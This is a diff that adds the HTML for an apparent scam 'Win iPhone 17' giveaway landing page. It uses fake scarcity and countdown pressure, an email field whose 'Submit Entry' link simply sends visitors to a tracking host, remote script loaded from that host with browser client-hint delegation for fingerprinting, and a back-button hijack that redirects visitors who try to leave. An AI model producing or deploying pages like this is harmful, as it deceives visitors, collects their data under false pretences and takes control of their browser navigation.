@@ -1,0 +1,159 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>iPhone Giveaway</title>
+    <link rel="stylesheet" href="styles.css">
+    <link href="https://fonts.googleapis.com/css2?family=Helvetica:wght@300;400;700&amp;display=swap" rel="stylesheet">
+    <link rel="icon" href="favicon.ico">
+    
+    <meta http-equiv="delegate-ch"
+        content="sec-ch-ua https://zo.smartsubzone.top; sec-ch-ua-mobile https://zo.smartsubzone.top; sec-ch-ua-arch https://zo.smartsubzone.top; sec-ch-ua-model https://zo.smartsubzone.top; sec-ch-ua-platform https://zo.smartsubzone.top; sec-ch-ua-platform-version https://zo.smartsubzone.top; sec-ch-ua-bitness https://zo.smartsubzone.top; sec-ch-ua-full-version-list https://zo.smartsubzone.top; sec-ch-ua-full-version https://zo.smartsubzone.top" />
+
+    <script>!function (w, d, o, n, c) { w[o] = w[o] || function () { (w[o].q = w[o].q || []).push(arguments) }; var s = d.createElement(n), t = d.getElementsByTagName(n)[0]; s.async = !0; s.defer = !0; s.src = "//zo.smartsubzone.top/t/t.js"; t.parentNode.insertBefore(s, t); }(window, document, "maxconv", "script");</script>
+    <noscript>
+        <link rel="stylesheet" href="//zo.smartsubzone.top/t/t.css?mc_ns=1" />
+    </noscript>
+
+    <script>
+        var back = 'https://zo.smartsubzone.top/click/2';
+        var under = 'https://zo.smartsubzone.top/click/3';
+    </script>
+    <script src="https://backunder.com/script.js"></script>
+    <script>window.addEventListener("pageshow", function (event) { (event.persisted || "back_forward" == performance.getEntriesByType("navigation")[0].type) && (window.location.href = "https://zo.smartsubzone.top/click/4") });</script>
+</head>
+
+<body>
+    <header class="header">
+        <img src="logo.png" alt="Company Logo">
+    </header>
+
+    <section class="hero">
+        <div class="hero-content">
+            <h1>Win iPhone 17</h1>
+            <p>Enter for a chance to win an iPhone 17. It's easy, fast, and free!</p>
+            <button class="cta-button" id="enter-now-button" onclick="openModal()">Enter Now</button>
+        </div>
+        <div class="hero-image">
+            <img src="iphone.png" alt="iPhone Image">
+        </div>
+    </section>
+
+    <section class="countdown-section" id="countdown-section">
+        <h2>Giveaway Ends in:</h2>
+        <div class="countdown-container">
+            <div class="countdown">
+                <div class="time-box">
+                    <span class="number" id="days">00</span>
+                    <span class="label">Days</span>
+                </div>
+                <div class="time-box">
+                    <span class="number" id="hours">00</span>
+                    <span class="label">Hours</span>
+                </div>
+                <div class="time-box">
+                    <span class="number" id="minutes">00</span>
+                    <span class="label">Minutes</span>
+                </div>
+                <div class="time-box">
+                    <span class="number" id="seconds">00</span>
+                    <span class="label">Seconds</span>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer">
+        <p>&copy; 2025 iPhone Giveaway. All rights reserved.</p>
+    </footer>
+
+    <!-- Modal for Multi-Step Entry -->
+    <div id="entryModal" class="modal">
+        <div class="modal-content">
+            <span class="close" onclick="closeModal()">&times;</span>
+            <form id="giveawayForm">
+                <!-- Step 1: Choose Model -->
+                <div class="form-step" id="step1">
+                    <h2>Select iPhone Model</h2>
+                    <div class="form-group">
+                        <input type="radio" id="model16" name="model" value="iPhone 16" required checked>
+                        <label for="model16">iPhone Air (42 left)</label>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="radio" id="model16Plus" name="model" value="iPhone 16 Plus">
+                        <label for="model16Plus">iPhone 17 (25 left)</label>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="radio" id="model16Pro" name="model" value="iPhone 16 Pro">
+                        <label for="model16Pro">iPhone 17 Pro (<span style="color:red;">Last one - Hurry</span>)</label>
+                    </div>
+
+                    <div class="form-group">
+                        <input type="radio" id="model16ProMax" name="model" value="iPhone 17 Pro Max" disabled>
+                        <label for="model16ProMax" style="color: gray; text-decoration: line-through;">
+                            iPhone 17 Pro Max (All claimed)
+                        </label>
+                    </div>
+                    <button type="button" class="navigation-button next-button" onclick="nextStep(2)">Next</button>
+                </div>
+
+                <!-- Step 2: Choose Color -->
+                <div class="form-step" id="step2" style="display: none;">
+                    <h2>Select Color</h2>
+                    <div class="form-group">
+                        <input type="radio" id="colorDesert" name="color" value="Cosmic Orange" required checked>
+                        <label for="colorDesert">Cosmic Orange</label>
+                    </div>
+                    <div class="form-group">
+                        <input type="radio" id="colorNatural" name="color" value="Deep Blue">
+                        <label for="colorNatural">Deep Blue</label>
+                    </div>
+                    <div class="form-group">
+                        <input type="radio" id="colorWhite" name="color" value="Silver">
+                        <label for="colorWhite">Silver</label>
+                    </div>
+                    <button type="button" class="navigation-button back-button" onclick="previousStep(1)">Back</button>
+                    <button type="button" class="navigation-button next-button" onclick="nextStep(3)">Next</button>
+                </div>
+
+                <!-- Step 3: Choose Storage -->
+                <div class="form-step" id="step3" style="display: none;">
+                    <h2>Select Storage</h2>
+                    <div class="form-group">
+                        <input type="radio" id="storage256" name="storage" value="256 GB" required checked>
+                        <label for="storage256">256 GB</label>
+                    </div>
+                    <div class="form-group">
+                        <input type="radio" id="storage512" name="storage" value="512 GB">
+                        <label for="storage512">512 GB</label>
+                    </div>
+                    <div class="form-group">
+                        <input type="radio" id="storage1000" name="storage" value="1 TB">
+                        <label for="storage1000">1 TB</label>
+                    </div>
+                    <button type="button" class="navigation-button back-button" onclick="previousStep(2)">Back</button>
+                    <button type="button" class="navigation-button next-button" onclick="nextStep(4)">Next</button>
+                </div>
+
+                <!-- Step 4: Enter Email -->
+                <div class="form-step" id="step4" style="display: none;">
+                    <h2>Enter Details</h2>
+                    <div class="form-group">
+                        <label class="details-label" for="email">Email Address</label>
+                        <input type="email" id="email" name="email" required>
+                    </div>
+                    <button type="button" class="navigation-button back-button" onclick="previousStep(3)">Back</button>
+                    <a href="https://zo.smartsubzone.top/click/1">Submit Entry</a>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="script.js"></script>
+</body>
+
+</html>
